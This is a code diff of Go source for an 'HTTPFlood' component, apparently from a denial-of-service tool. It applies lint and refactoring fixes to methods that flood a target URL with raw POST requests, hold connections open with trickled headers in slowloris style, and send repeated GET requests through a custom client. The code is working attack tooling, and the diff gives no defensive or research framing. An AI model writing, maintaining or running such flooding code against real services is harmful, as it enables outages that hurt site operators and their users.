@@ -191,7 +191,7 @@ func (h *HTTPFlood) head() {
 func (h *HTTPFlood) post() {
 	u := h.parsedURL()
 	body := randStr(32)
-	extra := fmt.Sprintf("Content-Length: 44\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/json\r\n\r\n{\"data\": \"%s\"}", body)
+	extra := fmt.Sprintf("Content-Length: 44\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/json\r\n\r\n{\"data\": \"%s\"}", body) //nolint:gocritic // %q would double-quote the JSON value
 	payload := []byte(h.buildRequest("POST", u.RequestURI(), extra))
 	h.sendRaw(payload, h.RPC)
 }
@@ -199,7 +199,7 @@ func (h *HTTPFlood) post() {
 func (h *HTTPFlood) stress() {
 	u := h.parsedURL()
 	body := randStr(512)
-	extra := fmt.Sprintf("Content-Length: 524\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/json\r\n\r\n{\"data\": \"%s\"}", body)
+	extra := fmt.Sprintf("Content-Length: 524\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/json\r\n\r\n{\"data\": \"%s\"}", body) //nolint:gocritic // %q would double-quote the JSON value
 	payload := []byte(h.buildRequest("POST", u.RequestURI(), extra))
 	h.sendRaw(payload, h.RPC)
 }
@@ -345,11 +345,10 @@ func (h *HTTPFlood) slow() {
 		if _, err := conn.Read(buf); err != nil {
 			return
 		}
-		for i := 0; i < h.RPC; i++ {
+		if h.RPC > 0 {
 			keep := fmt.Sprintf("X-a: %d\r\n", rand.Intn(5000)+1)
 			_, _ = conn.Write([]byte(keep))
 			time.Sleep(time.Duration(h.RPC) * time.Millisecond * 67)
-			break
 		}
 	}
 }
@@ -367,7 +366,7 @@ func (h *HTTPFlood) bypass() {
 	client := &http.Client{Transport: transport, Timeout: 10 * time.Second}
 
 	for range h.RPC {
-		req, err := http.NewRequest("GET", h.TargetURL, http.NoBody)
+		req, err := http.NewRequestWithContext(context.Background(), "GET", h.TargetURL, http.NoBody)
 		if err != nil {
 			continue
 		}
